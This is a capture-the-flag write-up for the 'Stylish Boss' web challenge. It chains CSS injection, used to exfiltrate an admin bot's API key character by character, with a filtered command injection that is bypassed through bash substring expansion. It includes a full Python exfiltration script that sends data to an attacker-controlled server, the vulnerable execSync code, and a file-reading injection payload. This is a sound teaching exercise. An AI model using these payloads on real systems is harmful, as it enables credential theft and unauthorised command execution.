---
categories:
  - CAT CTF
image:
  path: /assets/posts/Stylish Boss/preview.jpg
layout: post
stags:
title: Stylish Boss
---

**Stylish Boss** was a sneaky web challenge packed with tricks. At first, it looked simple — play around with fonts and profiles — but under the hood it turned into a full chain: **CSS injection for data exfiltration → stealing the Boss’s API key → bypassing filters to land command execution**. It felt like solving three challenges in one, and the final payload was just too satisfying. Let’s break it down step by step


We begin with a simple login page.

![](/assets/posts/Stylish-Boss/Stylish-Boss,.png)


![](/assets/posts/Stylish-Boss/Stylish-Boss,-1.png)

From `/profile` we can see two available functionalities. Returning to `/`, there’s also a button to set your preferred font.
![](/assets/posts/Stylish-Boss/Stylish-Boss,-2.png)
now let's dive into the source code 

![](/assets/posts/Stylish-Boss/Stylish-Boss,-3.png)

We can see that `fontPreference` is stored in the database, but some filters are applied — specifically, the `<` and `>` characters are blocked.

Now let's see where this fontName goes

![](/assets/posts/Stylish-Boss/Stylish-Boss,-5.png)
The value is only reflected back in our profile, meaning we can inject CSS, but it only affects us. Let’s revisit the code to figure out how we can make the admin load our injected `userFont`.

![](/assets/posts/Stylish-Boss/Stylish-Boss,-4.png)

The `report` feature simply makes a bot, logged in as the Boss, visit our profile.

![](/assets/posts/Stylish-Boss/Stylish-Boss,-6.png)

As we can see, the bot loads the user’s `fontPreference` — the one we control, not its own. At this point, I wasn’t sure what to do. I didn’t even know CSS injection was a thing, so I started researching.

I came across [this blog](https://www.invicti.com/blog/web-security/private-data-stolen-exploiting-css-injection/)which gave me the idea that I could exfiltrate data from the HTML page character by character. Here’s an example:

![](/assets/posts/Stylish-Boss/Stylish-Boss,-7.png)
By brute-forcing each character, we can make the page send requests to our server depending on the value of an element. It sounds crazy, but it actually works.

The last piece of the puzzle is knowing which element to exfiltrate. Let’s take another look at the code.

![](/assets/posts/Stylish-Boss/Stylish-Boss,-8.png)

Sure enough, there’s an interesting element in the page that stores the `apiKey`. This means we can exfiltrate the Boss’s API key.

plan is simple css injection charecter per charecter

that's the payload that I found working 

```python
payload = f"';#api-key-container[data-internal-api-key^=\"{candidate}\"]{{background-image: url(\"{LOCAL_SERVER}/{candidate}\")}};"
```


and that's the entire script to get the key
```python
import requests
import string
import threading
import http.server
import socketserver
import queue
import time

# Target server
TARGET = "http://51.21.169.15:3001"
SET_FONT_URL = f"{TARGET}/set-font"
REPORT_URL = f"{TARGET}/report"

# Your token
COOKIE = "token=Your-token"

USERNAME = "enter-your-username"
# Charset to brute-force
charset = string.ascii_lowercase + string.digits

# Local server to receive exfiltrated character
LOCAL_HOST = "0.0.0.0"
LOCAL_PORT = 80
LOCAL_SERVER = f"NGROK"   # <- put your real IP or ngrok domain here

# Thread-safe queue to capture hits
hits = queue.Queue()

class ExfilRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Path looks like: /candidateprefix
        candidate = self.path.strip("/")
        if candidate:
            print(f"[+] Hit detected: {candidate}")
            hits.put(candidate)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def start_http_server():
    with socketserver.TCPServer((LOCAL_HOST, LOCAL_PORT), ExfilRequestHandler) as httpd:
        print(f"[*] Listening on {LOCAL_HOST}:{LOCAL_PORT}")
        httpd.serve_forever()

def send_set_font(payload):
    data = {"fontName": payload}
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": COOKIE
    }
    return requests.post(SET_FONT_URL, data=data, headers=headers)

def send_report():
    json_data = {"username": USERNAME}
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/json",
        "Cookie": COOKIE
    }
    return requests.post(REPORT_URL, json=json_data, headers=headers)

def brute_force_key():
    key = "sk_"
    while True:
        found = False
        for c in charset:
            candidate = key + c
            payload = f"';#api-key-container[data-internal-api-key^=\"{candidate}\"]{{background-image: url(\"{LOCAL_SERVER}/{candidate}\")}};"

            # Step 1: Set font with payload
            send_set_font(payload)

            # Step 2: Trigger the report (which makes the victim render CSS)
            send_report()

            print(f"[*] Trying {candidate}...")

            try:
                # Wait a few seconds for request to arrive
                hit = hits.get(timeout=5)
                if hit == candidate:
                    print(f"[+] Found next char: {c}")
                    key += c
                    found = True
                    break
            except queue.Empty:
                pass

        if not found:
            print("[*] No more hits. Brute-force finished.")
            break
        print(f"[+] Current key: {key}")

if __name__ == "__main__":
    # Start local HTTP server in background
    server_thread = threading.Thread(target=start_http_server, daemon=True)
    server_thread.start()

    # Give server a moment to boot
    time.sleep(1)

    # Start brute force
    brute_force_key()


```


Now that we have the API key, let’s see what we can do with it.

![](/assets/posts/Stylish-Boss/Stylish-Boss,-9.png)
There’s an `api.js` file that requires the Boss’s API key. It takes whatever we supply in the `x-fil-name` header and passes it to a function called `processFile` from a package named **metadata-stripper**. I’d never heard of it before, so I checked its source code.

![](/assets/posts/Stylish-Boss/Stylish-Boss,-10.png)
Here it is — also written by the challenge author. Let’s take a closer look at the `processFile` function.

```js
   processFile(filename) {

        const sanitizedFilename = path

        .basename(filename)

        .replace(/[^\w${}:()" \n|]/g, '')

        .replace(/[flag]/gi, '');


        const command = "exiftool -all= " + sanitizedFilename;


        console.log(`[metadata-stripper] Attempting to execute command: "${command}"`);


        let output = '';

        try {

            output = execSync(command, { timeout: 5000, encoding: 'utf8' });

            console.log(`[metadata-stripper] Exiftool output (simulated): ${output.trim()}`);

            console.log(`[metadata-stripper] Command executed successfully.`);

        } catch (error) {

            console.error(`[metadata-stripper] Error running exiftool command: ${error.message}`);

            // Log stdout and stderr from the error object to see the output on failure.

            if (error.stdout) {

                console.log(`[metadata-stripper] STDOUT on error: ${error.stdout.trim()}`);

                output = error.stdout; // Capture stdout even on error

            }

            if (error.stderr) {

                console.error(`[metadata-stripper] STDERR on error: ${error.stderr.trim()}`);

            }

        }
```

Right off the bat, we can see it’s vulnerable to command injection. However, there are some strict filters: we can’t use any of the letters `F`, `L`, `A`, or `G` (uppercase or lowercase), and only a limited set of special characters are allowed.

```
${}:()" \n |
```

This reminded me of a HackTheBox challenge called **Broken-Shell**, where I used a similar trick to break out of a restricted shell using expression expansion.

For example, if we have a variable named `test` containing the string `FLAG`, we can expand individual characters with the following syntax:

`${test:1:1}` → `${variable-name:start-index:length}`

Here are all the available environment variables:
![](/assets/posts/Stylish-Boss/Stylish-Boss,-11.png)


variables we could use:
```bash
NODE=/usr/local/bin/node
COLOR=0
EDITOR=vi
PWD=/application
PORT=3001
HOME=/root
SHLVL=1
PATH=/application/node_modules/.bin:/node_modules/.bin:/usr/local/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NODE_VERSION=18.20.8
```

All we need is to execute:

```
cat /*
```
Since `A` is blacklisted, we can substitute it with `${PWD:1:1}`.  
Since `/` is blacklisted, we can use `${PWD:0:1}` instead.

Finally, we wrap it in `$()` so the command gets executed.

The final payload becomes:

```bash
test | echo $(c${PWD:1:1}t ${PWD:0:1}*)
```

![](/assets/posts/Stylish-Boss/Stylish-Boss,-12.png)

```bash
CATF{132231123213_Y0U_M4D3_1T_B055_Y0U_D3S3RV3_4_MU5HR00M_45_4_G1FT!_23312213132}
```